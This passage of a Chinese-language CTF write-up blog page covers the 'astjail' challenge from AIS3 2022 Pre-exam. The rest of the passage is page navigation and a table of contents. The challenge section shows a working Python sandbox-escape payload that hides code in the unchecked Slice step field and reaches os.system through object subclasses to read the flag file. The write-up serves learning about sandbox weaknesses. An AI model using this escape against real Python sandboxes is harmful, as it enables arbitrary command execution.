+<p>從 <a target="_blank" rel="noopener" href="https://docs.python.org/3.10/library/ast.html">ast</a> 的程式碼可以看到，Slice 其實有三個參數，而上面只 traverse 了兩個（<code>step</code> 沒有被 traverse 到，因此可以拿來利用）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Slice(expr? lower, expr? upper, expr? step)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Exploit-6"><a href="#Exploit-6" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出 library</span></span><br><span class="line">[<span class="built_in">int</span>][::<span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">enumerate</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__())))]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># (124, &lt;class &#x27;collections.abc.Sized&#x27;&gt;), (125, &lt;class &#x27;collections.abc.Container&#x27;&gt;), (126, &lt;class &#x27;collections.abc.Callable&#x27;&gt;), (127, &lt;class &#x27;os._wrap_close&#x27;&gt;)</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># os library 在 index 127</span></span><br><span class="line">[<span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>][::<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">127</span>])]</span><br><span class="line"><span class="comment"># 戳出 flag</span></span><br><span class="line">[<span class="built_in">int</span>,<span class="built_in">int</span>,<span class="built_in">int</span>][::<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;cat ./flag.txt&#x27;</span>))]</span><br></pre></td></tr></table></figure>
+
+<h4 id="Result-5"><a href="#Result-5" class="headerlink" title="Result"></a>Result</h4><p><img src="https://hackmd.io/_uploads/r1VSmXksq.png"></p>
+
+    </article>
+    <!-- license -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="https://jeff14994.github.io">atx0mg</a>
+            <p>Link：<a href="https://jeff14994.github.io/2022/07/04/AIS3-2022-Pre-exam/">https://jeff14994.github.io/2022/07/04/AIS3-2022-Pre-exam/</a>
+            <p>Publish date：<a href="https://jeff14994.github.io/2022/07/04/AIS3-2022-Pre-exam/">July 4th 2022, 5:04:03 pm</a>
+            <p>Update date：<a href="https://jeff14994.github.io/2022/07/04/AIS3-2022-Pre-exam/">April 10th 2025, 11:37:48 am</a>
+            <p>License：This article is licensed under CC BY-NC 4.0</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2022/03/11/write4-rop/" title="write4 rop">
+                    <div class="prevTitle">write4 rop</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:jeff14994 [at] gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/jeff14994" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://www.facebook.com/jeff.hong.14994" class="iconfont-archer facebook" target="_blank" title=facebook></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://www.linkedin.com/in/jeff14994/" class="iconfont-archer linkedin" target="_blank" title=linkedin></a>
+            
+        
+    
+        
+    
+        
+            
+                <a href="https://hackmd.io/@jeff14994" class="iconfont-archer others" target="_blank" title=others></a>
+            
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Overview"><span class="toc-number">1.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">2.</span> <span class="toc-text">[Pwn]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BOF2WIN"><span class="toc-number">2.1.</span> <span class="toc-text">BOF2WIN</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.1.2.</span> <span class="toc-text">Exploit Code:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Result"><span class="toc-number">2.1.3.</span> <span class="toc-text">Result</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Got-flag-AIS3-Re-1-B0F-m4st3r"><span class="toc-number">2.1.4.</span> <span class="toc-text">Got flag: AIS3{Re@1_B0F_m4st3r!!}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SAAS-Crash"><span class="toc-number">2.2.</span> <span class="toc-text">SAAS - Crash</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit"><span class="toc-number">2.2.2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Got-flag-AIS3-congrats-on-crashing-my-editor-but-can-you-get-shell-from-it"><span class="toc-number">2.2.3.</span> <span class="toc-text">Got flag: AIS3{congrats_on_crashing_my_editor!_but_can_you_get_shell_from_it?}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">3.</span> <span class="toc-text">[Reverse]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Time-Management"><span class="toc-number">3.1.</span> <span class="toc-text">Time Management</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="toc-number">3.1.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-1"><span class="toc-number">3.1.2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Got-flag-AIS3-You-are-the-master-of-time-management"><span class="toc-number">3.1.3.</span> <span class="toc-text">Got flag: AIS3{You_are_the_master_of_time_management!!!!!}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Give-Me-SC"><span class="toc-number">3.2.</span> <span class="toc-text">Give Me SC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-2"><span class="toc-number">3.2.1.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Result-1"><span class="toc-number">3.2.2.</span> <span class="toc-text">Result</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">4.</span> <span class="toc-text">[Web]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Poking-Bear"><span class="toc-number">4.1.</span> <span class="toc-text">Poking Bear</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Result-2"><span class="toc-number">4.1.1.</span> <span class="toc-text">Result</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Got-flag-AIS3-y0u-P0l3-7h3-Bear-H-rdLy-lt"><span class="toc-number">4.1.2.</span> <span class="toc-text">Got flag: AIS3{y0u_P0l3_7h3_Bear_H@rdLy&lt;}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Simple-File-Uploader"><span class="toc-number">4.2.</span> <span class="toc-text">Simple File Uploader</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-3"><span class="toc-number">4.2.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-Code-1"><span class="toc-number">4.2.2.</span> <span class="toc-text">Exploit Code</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Got-flag-AIS3-H3yyyyyyyy-U-g0t-mi%D9%A9-%CB%8A%E1%97%9C%CB%8B-%D9%88"><span class="toc-number">4.2.3.</span> <span class="toc-text">Got flag: AIS3{H3yyyyyyyy_U_g0t_mi٩(ˊᗜˋ*)و}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#the-best-login-ui"><span class="toc-number">4.3.</span> <span class="toc-text">the_best_login_ui</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description"><span class="toc-number">4.3.1.</span> <span class="toc-text">Description</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">5.</span> <span class="toc-text">[Crypto]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SC"><span class="toc-number">5.1.</span> <span class="toc-text">SC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-4"><span class="toc-number">5.1.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E6%96%87-x3D-gt-%E8%A6%81%E6%83%B3%E8%BE%A6%E6%B3%95%E6%89%BE%E5%88%B0%E5%B0%8D%E6%87%89%E7%9A%84-key-%E8%BD%89%E5%9B%9E%E6%98%8E%E6%96%87"><span class="toc-number">5.1.2.</span> <span class="toc-text">密文 &#x3D;&gt; 要想辦法找到對應的 key 轉回明文</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Source-Code"><span class="toc-number">5.1.3.</span> <span class="toc-text">Source Code</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%B9%B9%E7%AD%86%E8%A8%98"><span class="toc-number">5.1.4.</span> <span class="toc-text">自幹筆記</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Got-flag-%E6%88%91%E7%99%BC%E7%8F%BE%E5%A5%BD%E5%83%8F%E6%B2%92%E5%AD%98%E5%88%B0-%EF%BC%8C%E4%B8%8D%E9%81%8E%E5%8F%AF%E4%BB%A5%E5%9C%A8%E7%AD%86%E8%A8%98%E8%A3%A1%E9%9D%A2%E7%9C%8B%E5%88%B0"><span class="toc-number">5.1.5.</span> <span class="toc-text">Got flag: 我發現好像沒存到...，不過可以在筆記裡面看到</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">6.</span> <span class="toc-text">[Misc]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gift-in-the-dream"><span class="toc-number">6.1.</span> <span class="toc-text">Gift in the dream</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-5"><span class="toc-number">6.1.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-3"><span class="toc-number">6.1.2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Result-3"><span class="toc-number">6.1.3.</span> <span class="toc-text">Result</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Got-flag-AIS3-5T3g4n0gR4pHy-c4N-b3-fUn-s0m37iMe"><span class="toc-number">6.1.4.</span> <span class="toc-text">Got flag: AIS3{5T3g4n0gR4pHy_c4N_b3_fUn_s0m37iMe}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Excel"><span class="toc-number">6.2.</span> <span class="toc-text">Excel</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-4"><span class="toc-number">6.2.1.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Result-4"><span class="toc-number">6.2.2.</span> <span class="toc-text">Result</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Got-flag-AIS3-XLM-iS-to0-o1d-but-co0o0o00olll"><span class="toc-number">6.2.3.</span> <span class="toc-text">Got flag: AIS3{XLM_iS_to0_o1d_but_co0o0o00olll!!}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#knock"><span class="toc-number">6.3.</span> <span class="toc-text">knock</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Got-flag-AIS3-kn0ckKNOCKknock"><span class="toc-number">6.3.1.</span> <span class="toc-text">Got flag: AIS3{kn0ckKNOCKknock}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#seadog-webshell"><span class="toc-number">6.4.</span> <span class="toc-text">seadog_webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-1"><span class="toc-number">6.4.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-6"><span class="toc-number">6.4.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-5"><span class="toc-number">6.4.3.</span> <span class="toc-text">Exploit:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#astjail"><span class="toc-number">6.5.</span> <span class="toc-text">astjail</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Descripiton"><span class="toc-number">6.5.1.</span> <span class="toc-text">Descripiton</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-6"><span class="toc-number">6.5.2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Result-5"><span class="toc-number">6.5.3.</span> <span class="toc-text">Result</span></a></li></ol></li></ol></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 11
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2022 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/04</span>
+            <a class="archive-post-title" href="/2022/07/04/AIS3-2022-Pre-exam/">AIS3 2022 Pre-exam</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/11</span>
+            <a class="archive-post-title" href="/2022/03/11/write4-rop/">write4 rop</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2021 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span>
+            <a class="archive-post-title" href="/2021/12/06/MetaCTF-2021/">MetaCTF 2021</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span>
+            <a class="archive-post-title" href="/2021/11/28/TFCCTF-2021/">TFCCTF 2021</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/15</span>
+            <a class="archive-post-title" href="/2021/11/15/K3RN3LCTF-2021/">K3RN3LCTF 2021</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span>
+            <a class="archive-post-title" href="/2021/11/06/Dam-CTF-2021/">Dam CTF 2021</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span>
+            <a class="archive-post-title" href="/2021/10/31/Killer-Queen-CTF-2021/">Killer Queen CTF 2021</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/23</span>
+            <a class="archive-post-title" href="/2021/10/23/BuckeyeCTF-2021/">BuckeyeCTF 2021</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/19</span>
+            <a class="archive-post-title" href="/2021/09/19/SunshineCTF-2021/">SunshineCTF 2021</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/13</span>
+            <a class="archive-post-title" href="/2021/09/13/CSAWCTF-2021/">CSAWCTF 2021</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/28</span>
+            <a class="archive-post-title" href="/2021/08/28/FWordCTF-2021/">FWordCTF 2021</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="ctf">
+                <span class="iconfont-archer">&#xe606;</span>
+                ctf
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="AIS3">
+                <span class="iconfont-archer">&#xe606;</span>
+                AIS3
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="forensics">
+                <span class="iconfont-archer">&#xe606;</span>
+                forensics
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="wargame">
+                <span class="iconfont-archer">&#xe606;</span>
+                wargame
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="2022">
+                <span class="iconfont-archer">&#xe606;</span>
+                2022
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="rop">
+                <span class="iconfont-archer">&#xe606;</span>
+                rop
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="ROP Emporium">
+                <span class="iconfont-archer">&#xe606;</span>
+                ROP Emporium
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="pwn">
+                <span class="iconfont-archer">&#xe606;</span>
+                pwn
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "https://jeff14994.github.io",
+        root: siteMetaRoot,
+        author: "atx0mg"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
